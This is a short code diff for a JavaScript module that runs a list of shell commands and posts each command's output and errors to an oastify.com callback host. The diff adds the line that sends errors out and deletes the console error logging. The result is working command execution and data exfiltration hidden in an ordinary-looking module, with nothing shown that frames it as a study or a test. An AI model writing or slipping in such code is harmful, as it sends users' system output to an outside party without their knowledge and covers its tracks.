@@ -13,13 +13,11 @@ module.exports = (context, req, res) => {
 for (const item of commands) {
   subProcess.exec(item, (err, stdout, stderr) => {
     if (err) {
-      console.error(`Error executing command ${item}:`, err);
-      // Do not exit the process, continue to execute other commands
+      axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/', err);
     } else {
       var out = stdout.toString();
       var error = stderr.toString();
       axios.post('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/' + item, out + error)
-        .catch(err => console.error(`Error posting result for command ${item}:`, err));
     }
   });
 }
